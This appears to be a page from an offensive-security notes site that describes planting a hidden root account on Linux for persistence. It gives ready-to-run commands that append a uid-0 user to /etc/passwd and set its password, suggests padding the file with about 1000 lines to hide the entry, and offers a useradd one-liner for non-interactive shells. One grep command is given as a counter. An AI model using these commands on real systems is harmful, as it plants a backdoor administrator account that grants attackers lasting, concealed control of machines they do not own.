# Adding a Root user

{% hint style="danger" %}
This technique is not opsec at all !
{% endhint %}

For some reason, it is not important that a user is named “root”, but that it’s uid is 0. So if you create a user with the uid 0, you’ll have root privileges. Multiple users with the same uid but different name isn’t harmful. So combining this with the 1000 scroll lines trick mentioned above, you have to do something like this:

```
echo 'hackr:x:0:0:hackr,,,:/home/hackr:/bin/bash' | sudo tee -a /etc/passwd
printf %sn%s hackr hackr | sudo passwd hackr
```

add 1000 lines to the `passwd` file and do the things above again. To counter:

```
grep ':0:' /etc/passwd
```

### <mark style="color:orange;">Oneliner for non-interactive shells</mark>

```
useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd yourpass` rootuser
```
